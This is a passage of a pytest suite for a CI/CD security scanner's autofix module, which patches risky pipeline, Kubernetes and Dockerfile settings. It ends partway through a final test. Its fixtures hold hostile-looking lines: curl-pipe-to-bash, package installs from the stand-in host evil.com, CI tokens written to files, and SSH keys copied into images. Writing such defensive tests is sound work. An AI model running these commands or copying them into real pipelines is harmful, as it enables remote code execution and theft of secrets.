"""Tests for core.autofix."""
from __future__ import annotations

from pipeline_check.core import autofix
from pipeline_check.core.checks.base import Finding, Severity


def _finding(check_id: str, resource: str = "wf.yml") -> Finding:
    return Finding(
        check_id=check_id,
        title="x",
        severity=Severity.MEDIUM,
        resource=resource,
        description="",
        recommendation="",
        passed=False,
    )


def test_gha004_adds_permissions_block_before_jobs():
    wf = (
        "name: ci\n"
        "\n"
        "on: push\n"
        "\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps: [{run: echo}]\n"
    )
    after = autofix.generate_fix(_finding("GHA-004"), wf)
    assert after is not None
    assert "permissions:\n  contents: read" in after
    # The inserted block sits above `jobs:`.
    assert after.index("permissions:") < after.index("jobs:")


def test_gha004_idempotent_when_block_exists():
    wf = (
        "name: ci\n"
        "permissions:\n"
        "  contents: read\n"
        "on: push\n"
        "jobs: {}\n"
    )
    assert autofix.generate_fix(_finding("GHA-004"), wf) is None


def test_generate_fix_returns_none_for_unknown_check_id():
    assert autofix.generate_fix(_finding("UNKNOWN-999"), "anything") is None


def test_render_patch_produces_unified_diff():
    patch = autofix.render_patch("wf.yml", "a\n", "b\n")
    assert "--- a/wf.yml" in patch
    assert "+++ b/wf.yml" in patch
    assert "-a" in patch
    assert "+b" in patch


def test_available_fixers_includes_gha004():
    assert "GHA-004" in autofix.available_fixers()


# ── Timeout fixers ─────────────────────────────────────────────────────


class TestGHA015Timeout:
    def test_inserts_timeout_in_job_missing_it(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        assert "build:\n    timeout-minutes: 30" in after

    def test_skips_job_with_timeout(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    timeout-minutes: 10\n"
            "    runs-on: ubuntu-latest\n"
        )
        assert autofix.generate_fix(_finding("GHA-015"), wf) is None

    def test_does_not_inject_under_steps(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        assert "steps:\n      timeout-minutes" not in after


class TestGL015Timeout:
    def test_inserts_timeout_in_gitlab_job(self):
        gl = "build:\n  script:\n    - make\n"
        after = autofix.generate_fix(_finding("GL-015"), gl)
        assert after is not None
        assert "build:\n  timeout: 30 minutes" in after

    def test_skips_job_with_timeout(self):
        gl = "build:\n  timeout: 10 minutes\n  script:\n    - make\n"
        assert autofix.generate_fix(_finding("GL-015"), gl) is None

    def test_skips_gitlab_meta_keys(self):
        gl = "stages:\n  - build\nbuild:\n  script:\n    - make\n"
        after = autofix.generate_fix(_finding("GL-015"), gl)
        assert after is not None
        assert "stages:\n  timeout:" not in after


class TestADO015Timeout:
    def test_inserts_timeout_in_azure_job(self):
        ado = "jobs:\n  - job: Build\n    pool:\n      vmImage: ubuntu-latest\n"
        after = autofix.generate_fix(_finding("ADO-015"), ado)
        assert after is not None
        assert "Build\n    timeoutInMinutes: 30" in after

    def test_skips_job_with_timeout(self):
        ado = "jobs:\n  - job: Build\n    timeoutInMinutes: 15\n    pool:\n      vmImage: ubuntu\n"
        assert autofix.generate_fix(_finding("ADO-015"), ado) is None


# ── Curl-pipe comment-out ──────────────────────────────────────────────


class TestCurlPipeCommentOut:
    def test_comments_out_curl_bash(self):
        wf = "  - run: curl https://example.com/s.sh | bash\n"
        after = autofix.generate_fix(_finding("GHA-016"), wf)
        assert after is not None
        assert "TODO(pipelineguard)" in after

    def test_idempotent(self):
        wf = "  - run: curl https://example.com/s.sh | bash\n"
        after = autofix.generate_fix(_finding("GHA-016"), wf)
        assert autofix.generate_fix(_finding("GHA-016"), after) is None

    def test_cross_provider_bb(self):
        bb = "          - curl https://example.com | sh\n"
        assert autofix.generate_fix(_finding("BB-012"), bb) is not None

    def test_cross_provider_jf(self):
        jf = '        sh "curl https://example.com | bash"\n'
        assert autofix.generate_fix(_finding("JF-016"), jf) is not None


# ── Docker flag removal ────────────────────────────────────────────────


class TestDockerFlagRemoval:
    def test_strips_privileged(self):
        wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf)
        assert after is not None
        assert "--privileged" not in after
        assert "docker run" in after

    def test_strips_host_mount(self):
        wf = "  - run: docker run -v /host:/mnt ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf)
        assert after is not None
        assert "-v /host:/mnt" not in after

    def test_idempotent(self):
        wf = "  - run: docker run --privileged ubuntu:latest\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf)
        assert autofix.generate_fix(_finding("GHA-017"), after) is None

    def test_cross_provider_gl(self):
        gl = "    - docker run --net=host myimage\n"
        after = autofix.generate_fix(_finding("GL-017"), gl)
        assert after is not None
        assert "--net=host" not in after


# ── Package flag removal ───────────────────────────────────────────────


class TestPkgFlagRemoval:
    def test_strips_insecure_index_url(self):
        wf = "  - run: pip install --index-url http://evil.com/simple/ requests\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf)
        assert after is not None
        assert "--index-url" not in after
        assert "pip install" in after

    def test_strips_trusted_host(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf)
        assert after is not None
        assert "--trusted-host" not in after

    def test_strips_npm_insecure_registry(self):
        wf = "  - run: npm install --registry=http://evil.com pkg\n"
        after = autofix.generate_fix(_finding("BB-014"), wf)
        assert after is not None
        assert "--registry" not in after

    def test_idempotent(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf)
        assert autofix.generate_fix(_finding("GHA-018"), after) is None


# ── Jenkins Groovy secret redaction ────────────────────────────────────


class TestJF008SecretRedaction:
    def test_redacts_aws_key(self):
        jf = '  AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
        after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
        assert after is not None
        assert "<REDACTED>" in after
        assert "AKIAIOSFODNN7EXAMPLE" not in after

    def test_preserves_non_secret(self):
        jf = '  SAFE = "hello"\n'
        assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf) is None

    def test_idempotent(self):
        jf = '  AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
        after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
        assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), after) is None


# ── BB-005 Bitbucket timeout ─────────────────────────────────────────


class TestBB005Timeout:
    def test_inserts_max_time(self):
        wf = "pipelines:\n  default:\n    - step:\n        script:\n          - make\n"
        after = autofix.generate_fix(_finding("BB-005"), wf)
        assert after is not None
        assert "max-time: 120" in after

    def test_idempotent(self):
        wf = "pipelines:\n  default:\n    - step:\n        max-time: 60\n        script:\n          - make\n"
        assert autofix.generate_fix(_finding("BB-005"), wf) is None


# ── JF-015 Jenkins timeout ───────────────────────────────────────────


class TestJF015Timeout:
    def test_inserts_todo(self):
        jf = "pipeline {\n    agent any\n    stages {\n    }\n}\n"
        after = autofix.generate_fix(_finding("JF-015", "Jenkinsfile"), jf)
        assert after is not None
        assert "TODO(pipelineguard): wrap with timeout" in after

    def test_idempotent(self):
        jf = "pipeline {\n    // TODO(pipelineguard): wrap with timeout(time: 30, unit: 'MINUTES')\n    agent any\n}\n"
        assert autofix.generate_fix(_finding("JF-015", "Jenkinsfile"), jf) is None


# ── GHA-001 pinning TODO ────────────────────────────────────────────


class TestGHA001PinningTodo:
    def test_adds_todo_to_unpinned_action(self):
        wf = "    - uses: actions/checkout@v4\n"
        after = autofix.generate_fix(_finding("GHA-001"), wf)
        assert after is not None
        assert "TODO(pipelineguard): pin to commit SHA" in after

    def test_skips_sha_pinned_action(self):
        wf = "    - uses: actions/checkout@4959ce089c2fe0a3ab7b3aaa3aebc6a0a17b2af9\n"
        assert autofix.generate_fix(_finding("GHA-001"), wf) is None

    def test_idempotent(self):
        wf = "    - uses: actions/checkout@v4  # TODO(pipelineguard): pin to commit SHA\n"
        assert autofix.generate_fix(_finding("GHA-001"), wf) is None


# ── GL-001 image pinning TODO ────────────────────────────────────────


class TestGL001PinningTodo:
    def test_adds_todo_to_unpinned_image(self):
        wf = "  image: python:3.12\n"
        after = autofix.generate_fix(_finding("GL-001"), wf)
        assert after is not None
        assert "TODO(pipelineguard): pin to digest" in after

    def test_skips_digest_pinned_image(self):
        wf = "  image: python@sha256:abc123\n"
        assert autofix.generate_fix(_finding("GL-001"), wf) is None


# ── Token persistence comment-out ────────────────────────────────────


class TestTokenPersistenceCommentOut:
    def test_gha019_comments_out_token_line(self):
        wf = '  - run: echo $GITHUB_TOKEN >> .env\n'
        after = autofix.generate_fix(_finding("GHA-019"), wf)
        assert after is not None
        assert "WARNING(pipelineguard)" in after
        assert "# - run:" in after or "# echo" in after

    def test_gl020_comments_out_token_line(self):
        wf = "  - echo $CI_JOB_TOKEN >> /tmp/token.txt\n"
        after = autofix.generate_fix(_finding("GL-020"), wf)
        assert after is not None
        assert "WARNING(pipelineguard)" in after

    def test_idempotent(self):
        wf = "  # WARNING(pipelineguard): token written to persistent storage — remove this line\n  # echo $GITHUB_TOKEN >> .env\n"
        assert autofix.generate_fix(_finding("GHA-019"), wf) is None


# ── GHA-014 deploy environment stub ──────────────────────────────────


class TestGHA014DeployEnvStub:
    def test_inserts_environment_into_deploy_job(self):
        wf = "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
        after = autofix.generate_fix(_finding("GHA-014"), wf)
        assert after is not None
        assert "environment:" in after
        assert "TODO(pipelineguard)" in after

    def test_skips_job_with_existing_environment(self):
        wf = "jobs:\n  deploy:\n    environment: production\n    runs-on: ubuntu-latest\n"
        assert autofix.generate_fix(_finding("GHA-014"), wf) is None

    def test_skips_non_deploy_job(self):
        wf = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
        assert autofix.generate_fix(_finding("GHA-014"), wf) is None


# ── Kubernetes drop-line fixers ───────────────────────────────────────


class TestK8sDropTrueLine:
    """K8S-002 / K8S-003 / K8S-004 / K8S-005 all drop a YAML key set to
    ``true``. Parameterised over the four rule IDs since the logic is
    identical."""

    def test_k8s005_drops_privileged_true(self):
        manifest = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec:\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx@sha256:abc\n"
            "      securityContext:\n"
            "        privileged: true\n"
        )
        after = autofix.generate_fix(_finding("K8S-005"), manifest)
        assert after is not None
        assert "privileged" not in after
        # Surrounding context preserved.
        assert "securityContext:" in after
        assert "image: nginx@sha256:abc" in after

    def test_k8s002_drops_host_network(self):
        manifest = "spec:\n  hostNetwork: true\n  containers: []\n"
        after = autofix.generate_fix(_finding("K8S-002"), manifest)
        assert after is not None
        assert "hostNetwork" not in after
        assert "containers: []" in after

    def test_k8s003_drops_host_pid(self):
        manifest = "spec:\n  hostPID: true\n"
        after = autofix.generate_fix(_finding("K8S-003"), manifest)
        assert after is not None
        assert "hostPID" not in after

    def test_k8s004_drops_host_ipc(self):
        manifest = "spec:\n  hostIPC: true\n"
        after = autofix.generate_fix(_finding("K8S-004"), manifest)
        assert after is not None
        assert "hostIPC" not in after

    def test_idempotent_when_key_absent(self):
        manifest = "spec:\n  containers: []\n"
        assert autofix.generate_fix(_finding("K8S-005"), manifest) is None
        assert autofix.generate_fix(_finding("K8S-002"), manifest) is None

    def test_skips_when_value_is_false(self):
        # Already at the safe default. No edit, ``None`` returned.
        manifest = "spec:\n  hostPID: false\n"
        assert autofix.generate_fix(_finding("K8S-003"), manifest) is None

    def test_each_rule_only_targets_its_own_key(self):
        # K8S-002 must not touch a hostPID line, etc.
        manifest = "spec:\n  hostNetwork: true\n  hostPID: true\n"
        after = autofix.generate_fix(_finding("K8S-002"), manifest)
        assert after is not None
        assert "hostNetwork" not in after
        assert "hostPID: true" in after


# ── Kubernetes flip-value fixers ──────────────────────────────────────


class TestK8sFlipValue:
    """K8S-006 / K8S-007 / K8S-008 flip an unsafe value in place
    rather than dropping the line, so any surrounding comment stays."""

    def test_k8s006_flips_allow_priv_escalation(self):
        manifest = "        allowPrivilegeEscalation: true\n"
        after = autofix.generate_fix(_finding("K8S-006"), manifest)
        assert after is not None
        assert "allowPrivilegeEscalation: false" in after

    def test_k8s007_flips_run_as_non_root(self):
        manifest = "        runAsNonRoot: false\n"
        after = autofix.generate_fix(_finding("K8S-007"), manifest)
        assert after is not None
        assert "runAsNonRoot: true" in after

    def test_k8s008_flips_read_only_root_fs(self):
        manifest = "        readOnlyRootFilesystem: false\n"
        after = autofix.generate_fix(_finding("K8S-008"), manifest)
        assert after is not None
        assert "readOnlyRootFilesystem: true" in after

    def test_preserves_inline_comment(self):
        manifest = "        readOnlyRootFilesystem: false  # legacy bug\n"
        after = autofix.generate_fix(_finding("K8S-008"), manifest)
        assert after is not None
        assert "readOnlyRootFilesystem: true" in after
        assert "# legacy bug" in after

    def test_idempotent_when_already_safe(self):
        # Flipped values are already correct.
        m6 = "        allowPrivilegeEscalation: false\n"
        m7 = "        runAsNonRoot: true\n"
        m8 = "        readOnlyRootFilesystem: true\n"
        assert autofix.generate_fix(_finding("K8S-006"), m6) is None
        assert autofix.generate_fix(_finding("K8S-007"), m7) is None
        assert autofix.generate_fix(_finding("K8S-008"), m8) is None

    def test_no_op_when_key_absent(self):
        manifest = "spec:\n  containers: []\n"
        assert autofix.generate_fix(_finding("K8S-006"), manifest) is None
        assert autofix.generate_fix(_finding("K8S-007"), manifest) is None
        assert autofix.generate_fix(_finding("K8S-008"), manifest) is None


# ── Kubernetes comment-only TODO fixers ───────────────────────────────


class TestK8s013HostPathTODO:
    def test_inserts_todo_above_hostpath(self):
        manifest = (
            "spec:\n"
            "  volumes:\n"
            "    - name: data\n"
            "      hostPath:\n"
            "        path: /var/log\n"
        )
        after = autofix.generate_fix(_finding("K8S-013"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-013)" in after
        # Comment lands above the hostPath: line, not below.
        idx_todo = after.index("TODO(pipelineguard K8S-013)")
        idx_hp = after.index("hostPath:")
        assert idx_todo < idx_hp

    def test_idempotent_after_run(self):
        manifest = (
            "spec:\n"
            "  volumes:\n"
            "    - name: data\n"
            "      hostPath:\n"
            "        path: /var/log\n"
        )
        once = autofix.generate_fix(_finding("K8S-013"), manifest)
        assert once is not None
        twice = autofix.generate_fix(_finding("K8S-013"), once)
        assert twice is None

    def test_no_op_when_no_hostpath(self):
        manifest = "spec:\n  volumes: []\n"
        assert autofix.generate_fix(_finding("K8S-013"), manifest) is None


class TestK8s020ClusterAdminTODO:
    def test_inserts_todo_above_cluster_admin_name(self):
        manifest = (
            "kind: ClusterRoleBinding\n"
            "roleRef:\n"
            "  apiGroup: rbac.authorization.k8s.io\n"
            "  kind: ClusterRole\n"
            "  name: cluster-admin\n"
        )
        after = autofix.generate_fix(_finding("K8S-020"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-020)" in after

    def test_matches_system_masters_too(self):
        manifest = "  name: system:masters\n"
        after = autofix.generate_fix(_finding("K8S-020"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-020)" in after

    def test_skips_unrelated_name_lines(self):
        manifest = "metadata:\n  name: my-deployment\n"
        assert autofix.generate_fix(_finding("K8S-020"), manifest) is None

    def test_idempotent_after_run(self):
        manifest = "  name: cluster-admin\n"
        once = autofix.generate_fix(_finding("K8S-020"), manifest)
        assert once is not None
        twice = autofix.generate_fix(_finding("K8S-020"), once)
        assert twice is None


# ── Cloud Build fixers ────────────────────────────────────────────────


class TestGCB005Timeout:
    def test_inserts_timeout_at_top(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud'\n    args: ['version']\n"
        after = autofix.generate_fix(_finding("GCB-005"), cb)
        assert after is not None
        assert after.startswith("timeout: '600s'\n")

    def test_idempotent_when_timeout_present(self):
        cb = "timeout: '300s'\nsteps: []\n"
        assert autofix.generate_fix(_finding("GCB-005"), cb) is None

    def test_no_op_when_not_a_cloudbuild_doc(self):
        # No top-level cloudbuild keys at all — fixer punts rather than
        # inserting at column 0 of a random doc.
        assert autofix.generate_fix(_finding("GCB-005"), "name: not-cb\n") is None


class TestGCB014Logging:
    def test_drops_logging_none(self):
        cb = "options:\n  logging: NONE\nsteps: []\n"
        after = autofix.generate_fix(_finding("GCB-014"), cb)
        assert after is not None
        assert "logging: NONE" not in after
        assert "options:" in after

    def test_handles_quoted_value(self):
        cb = "options:\n  logging: 'NONE'\n"
        after = autofix.generate_fix(_finding("GCB-014"), cb)
        assert after is not None
        assert "logging" not in after

    def test_idempotent_when_absent(self):
        assert autofix.generate_fix(_finding("GCB-014"), "options:\n  machineType: N1_HIGHCPU_8\n") is None


class TestGCB001PinTODO:
    def test_inserts_todo_above_unpinned_step(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud'\n"
        after = autofix.generate_fix(_finding("GCB-001"), cb)
        assert after is not None
        assert "TODO(pipelineguard GCB-001)" in after

    def test_skips_already_digest_pinned(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud@sha256:abcd'\n"
        assert autofix.generate_fix(_finding("GCB-001"), cb) is None

    def test_idempotent_after_run(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud'\n"
        once = autofix.generate_fix(_finding("GCB-001"), cb)
        assert once is not None
        twice = autofix.generate_fix(_finding("GCB-001"), once)
        assert twice is None


class TestGCB011TLSBypass:
    def test_reuses_shared_tls_bypass_fixer(self):
        # GCB-011 piggybacks on the same _comment_tls_bypass logic the
        # CI providers use. Use a curl -k command on its own line so
        # the shared TLS_BYPASS_RE matches.
        cb = (
            "steps:\n"
            "  - name: bash\n"
            "    script: curl -k https://example.com\n"
        )
        after = autofix.generate_fix(_finding("GCB-011"), cb)
        assert after is not None
        assert "TODO(pipelineguard): remove TLS/SSL verification bypass" in after


# ── Dockerfile comment-only TODO fixers ───────────────────────────────


class TestDF001PinTODO:
    def test_inserts_todo_above_floating_from(self):
        df = "FROM python:3.12-slim\nRUN echo hi\n"
        after = autofix.generate_fix(_finding("DF-001"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-001)" in after
        idx_todo = after.index("TODO(pipelineguard DF-001)")
        idx_from = after.index("FROM python:3.12-slim")
        assert idx_todo < idx_from

    def test_skips_already_digest_pinned(self):
        df = "FROM python@sha256:" + "0" * 63 + "1\n"
        assert autofix.generate_fix(_finding("DF-001"), df) is None

    def test_handles_multistage_partially_pinned(self):
        # First FROM is digest-pinned (skipped), second is floating
        # (annotated). Only one TODO inserted.
        df = (
            "FROM python@sha256:" + "0" * 63 + "1 AS build\n"
            "RUN make\n"
            "FROM debian:12.5\n"
            "COPY --from=build /out /app\n"
        )
        after = autofix.generate_fix(_finding("DF-001"), df)
        assert after is not None
        assert after.count("TODO(pipelineguard DF-001)") == 1

    def test_idempotent_after_run(self):
        df = "FROM debian:12.5\n"
        once = autofix.generate_fix(_finding("DF-001"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-001"), once) is None


class TestDF002UserTODO:
    def test_inserts_todo_above_cmd(self):
        df = "FROM debian:12.5\nCMD [\"sh\"]\n"
        after = autofix.generate_fix(_finding("DF-002"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-002)" in after
        idx_todo = after.index("TODO(pipelineguard DF-002)")
        idx_cmd = after.index("CMD")
        assert idx_todo < idx_cmd

    def test_skips_when_user_directive_present(self):
        df = "FROM debian:12.5\nUSER appuser\nCMD [\"sh\"]\n"
        assert autofix.generate_fix(_finding("DF-002"), df) is None

    def test_no_op_when_no_cmd_or_entrypoint(self):
        df = "FROM debian:12.5\nRUN echo hi\n"
        assert autofix.generate_fix(_finding("DF-002"), df) is None


class TestDF007HealthCheckTODO:
    def test_inserts_todo_above_cmd(self):
        df = "FROM debian:12.5\nCMD [\"sh\"]\n"
        after = autofix.generate_fix(_finding("DF-007"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-007)" in after

    def test_skips_when_healthcheck_present(self):
        df = (
            "FROM debian:12.5\n"
            "HEALTHCHECK CMD curl -fsS http://localhost/healthz || exit 1\n"
            "CMD [\"sh\"]\n"
        )
        assert autofix.generate_fix(_finding("DF-007"), df) is None


class TestDF013ExposeSSHTODO:
    def test_inserts_todo_above_expose_22(self):
        df = "FROM debian:12.5\nEXPOSE 22\n"
        after = autofix.generate_fix(_finding("DF-013"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-013)" in after

    def test_no_op_for_application_port(self):
        df = "FROM debian:12.5\nEXPOSE 8080\n"
        assert autofix.generate_fix(_finding("DF-013"), df) is None

    def test_idempotent(self):
        df = "FROM debian:12.5\nEXPOSE 22\n"
        once = autofix.generate_fix(_finding("DF-013"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-013"), once) is None


class TestDF017PathTODO:
    def test_inserts_todo_above_tmp_prepend(self):
        df = "FROM debian:12.5\nENV PATH=/tmp:$PATH\n"
        after = autofix.generate_fix(_finding("DF-017"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-017)" in after

    def test_no_op_when_writable_dir_at_tail(self):
        # Tail-position writable entry is harmless — system bins shadow
        # it. The fixer mirrors the rule's logic, so it shouldn't fire.
        df = "FROM debian:12.5\nENV PATH=$PATH:/tmp\n"
        assert autofix.generate_fix(_finding("DF-017"), df) is None

    def test_no_op_when_path_is_only_system_bins(self):
        df = "FROM debian:12.5\nENV PATH=/usr/bin:/usr/local/bin\n"
        assert autofix.generate_fix(_finding("DF-017"), df) is None


class TestK8S001ImagePinTODO:
    def test_inserts_todo_above_unpinned_image(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            "      image: nginx:latest\n"
        )
        after = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-001)" in after
        # Comment sits above the offending image: line, not the name: line.
        lines = after.splitlines()
        todo_idx = next(i for i, ln in enumerate(lines) if "TODO" in ln)
        assert "image:" in lines[todo_idx + 1]

    def test_skips_digest_pinned_image(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: api\n"
            "      image: api@sha256:" + "a" * 64 + "\n"
        )
        assert autofix.generate_fix(_finding("K8S-001"), manifest) is None

    def test_only_unpinned_get_todo_in_mixed_set(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            "      image: nginx:latest\n"
            "    - name: api\n"
            "      image: api@sha256:" + "a" * 64 + "\n"
        )
        after = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert after is not None
        # Exactly one TODO should appear (for the nginx:latest line).
        assert after.count("TODO(pipelineguard K8S-001)") == 1

    def test_handles_quoted_image_value(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            '      image: "nginx:1.25.4"\n'
        )
        after = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert after is not None

    def test_idempotent(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            "      image: nginx:latest\n"
        )
        once = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-001"), once) is None


class TestK8S028HostPortDrop:
    def test_drops_host_port_line(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: app\n"
            "      image: nginx@sha256:" + "a" * 64 + "\n"
            "      ports:\n"
            "        - containerPort: 8080\n"
            "          hostPort: 8080\n"
        )
        after = autofix.generate_fix(_finding("K8S-028"), manifest)
        assert after is not None
        assert "hostPort:" not in after
        assert "containerPort: 8080" in after

    def test_drops_inline_comment_too(self):
        manifest = "    hostPort: 9000  # node-port binding\n"
        after = autofix.generate_fix(_finding("K8S-028"), manifest)
        assert after is not None
        assert "hostPort" not in after

    def test_skips_zero_sentinel(self):
        # ``hostPort: 0`` is the unset sentinel; the rule already
        # treats it as passing, and the fixer mirrors that.
        manifest = "    hostPort: 0\n"
        assert autofix.generate_fix(_finding("K8S-028"), manifest) is None

    def test_idempotent(self):
        manifest = "    hostPort: 8080\n"
        once = autofix.generate_fix(_finding("K8S-028"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-028"), once) is None


class TestK8S029DefaultSATODO:
    def test_inserts_todo_above_default_subject(self):
        manifest = (
            "subjects:\n"
            "  - kind: ServiceAccount\n"
            "    name: default\n"
            "    namespace: apps\n"
        )
        after = autofix.generate_fix(_finding("K8S-029"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-029)" in after

    def test_no_op_for_named_sa(self):
        manifest = (
            "subjects:\n"
            "  - kind: ServiceAccount\n"
            "    name: app-sa\n"
            "    namespace: apps\n"
        )
        assert autofix.generate_fix(_finding("K8S-029"), manifest) is None

    def test_idempotent(self):
        manifest = (
            "subjects:\n"
            "  - kind: ServiceAccount\n"
            "    name: default\n"
        )
        once = autofix.generate_fix(_finding("K8S-029"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-029"), once) is None


class TestK8S030ControlPlaneTODO:
    def test_inserts_todo_above_node_selector(self):
        manifest = (
            "      nodeSelector:\n"
            "        node-role.kubernetes.io/control-plane: ''\n"
        )
        after = autofix.generate_fix(_finding("K8S-030"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-030)" in after

    def test_inserts_todo_above_master_toleration(self):
        manifest = (
            "      tolerations:\n"
            "        - key: node-role.kubernetes.io/master\n"
            "          operator: Exists\n"
        )
        after = autofix.generate_fix(_finding("K8S-030"), manifest)
        assert after is not None
        assert "TODO(pipelineguard K8S-030)" in after

    def test_no_op_for_unrelated_node_selector(self):
        manifest = (
            "      nodeSelector:\n"
            "        kubernetes.io/os: linux\n"
        )
        assert autofix.generate_fix(_finding("K8S-030"), manifest) is None

    def test_idempotent(self):
        manifest = (
            "      tolerations:\n"
            "        - key: node-role.kubernetes.io/control-plane\n"
            "          operator: Exists\n"
        )
        once = autofix.generate_fix(_finding("K8S-030"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-030"), once) is None


class TestGHA034SecretsInheritTODO:
    def test_inserts_todo_above_secrets_inherit(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    uses: octo/repo/.github/workflows/build.yml@v2\n"
            "    secrets: inherit\n"
        )
        after = autofix.generate_fix(_finding("GHA-034"), wf)
        assert after is not None
        assert "TODO(pipelineguard GHA-034)" in after

    def test_no_op_for_explicit_secrets_mapping(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    uses: octo/repo/.github/workflows/build.yml@v2\n"
            "    secrets:\n"
            "      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n"
        )
        assert autofix.generate_fix(_finding("GHA-034"), wf) is None

    def test_idempotent(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    uses: octo/repo/.github/workflows/build.yml@v2\n"
            "    secrets: inherit\n"
        )
        once = autofix.generate_fix(_finding("GHA-034"), wf)
        assert once is not None
        assert autofix.generate_fix(_finding("GHA-034"), once) is None


class TestGCB022SubstitutionOptionLooseDrop:
    def test_drops_allow_loose_line(self):
        cb = (
            "options:\n"
            "  logging: CLOUD_LOGGING_ONLY\n"
            "  substitutionOption: ALLOW_LOOSE\n"
            "steps: []\n"
        )
        after = autofix.generate_fix(_finding("GCB-022"), cb)
        assert after is not None
        assert "ALLOW_LOOSE" not in after
        assert "logging: CLOUD_LOGGING_ONLY" in after

    def test_drops_inline_comment_too(self):
        cb = "  substitutionOption: ALLOW_LOOSE  # tolerate undefined\n"
        after = autofix.generate_fix(_finding("GCB-022"), cb)
        assert after is not None
        assert "substitutionOption" not in after

    def test_no_op_for_must_match(self):
        cb = "options:\n  substitutionOption: MUST_MATCH\n"
        assert autofix.generate_fix(_finding("GCB-022"), cb) is None

    def test_idempotent(self):
        cb = "options:\n  substitutionOption: ALLOW_LOOSE\n"
        once = autofix.generate_fix(_finding("GCB-022"), cb)
        assert once is not None
        assert autofix.generate_fix(_finding("GCB-022"), once) is None


class TestGCB021WorkerPoolTODO:
    def test_inserts_todo_above_options(self):
        cb = (
            "options:\n"
            "  logging: CLOUD_LOGGING_ONLY\n"
            "steps:\n"
            "  - name: gcr.io/foo\n"
        )
        after = autofix.generate_fix(_finding("GCB-021"), cb)
        assert after is not None
        assert "TODO(pipelineguard GCB-021)" in after
        # The TODO sits ABOVE options:, not inside it.
        before_options = after.split("options:")[0]
        assert "TODO(pipelineguard GCB-021)" in before_options

    def test_no_op_when_no_options_block(self):
        # Without an ``options:`` anchor the fixer leaves the file
        # alone — inserting a top-level block from text is too easy
        # to misindent.
        cb = "steps:\n  - name: gcr.io/foo\n"
        assert autofix.generate_fix(_finding("GCB-021"), cb) is None

    def test_idempotent(self):
        cb = "options:\n  logging: CLOUD_LOGGING_ONLY\nsteps: []\n"
        once = autofix.generate_fix(_finding("GCB-021"), cb)
        assert once is not None
        assert autofix.generate_fix(_finding("GCB-021"), once) is None


class TestDF019CopyCredFileTODO:
    def test_inserts_todo_above_id_rsa_copy(self):
        df = "FROM alpine:3.19\nCOPY id_rsa /root/.ssh/id_rsa\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-019)" in after
        assert df.splitlines()[1] in after

    def test_inserts_todo_above_npmrc_copy(self):
        df = "FROM node:20\nCOPY --chown=node:node .npmrc /home/node/.npmrc\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None

    def test_inserts_todo_above_aws_credentials(self):
